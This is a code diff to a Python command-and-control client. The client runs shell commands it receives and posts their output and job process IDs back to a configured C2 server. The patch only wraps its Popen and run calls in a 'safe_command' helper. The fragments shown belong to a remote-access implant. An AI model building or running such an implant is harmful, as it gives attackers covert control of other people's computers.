@@ -22,6 +22,7 @@ from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, FILE_REQUEST,
                       C2_SERVER, DELAY, PORT, PROXY, HEADERS, FILE_SEND, ZIP_PASSWORD, INCOMING)
+from security import safe_command
 
 
 # Print C2 Client Side Message for avoid complexing in test operation
@@ -31,7 +32,7 @@ def run_job(os_command, count):
     """ This function will run an OS Command in the background and save output to the file.
     It gets called by the start method of multiprocessing Process. """
     with open(f"Job_{count}.txt", "w") as fHandle:
-        process = Popen(os_command, shell=True, stdout=fHandle, stderr=fHandle)
+        process = safe_command.run(Popen, os_command, shell=True, stdout=fHandle, stderr=fHandle)
         post_to_server(f"[+]-Client => Job_{count} has been started with pid: {process.pid}. "
                        f"\nUse the 'tasklist' command from windows to See all tasks with pid's. "
                        f"\nUse the 'taskkill /PID' command from windows to Kill a task with a pid number. "
@@ -175,7 +176,7 @@ if __name__ == "__main__":
             # otherwise run the command in the Background
             if not command.endswith(" &"):
                 # Run the command and get the output
-                commandOutput = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
+                commandOutput = safe_command.run(run, command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
 
                 # test print
                 # print("[+] OS-System command Executed on client Foreground
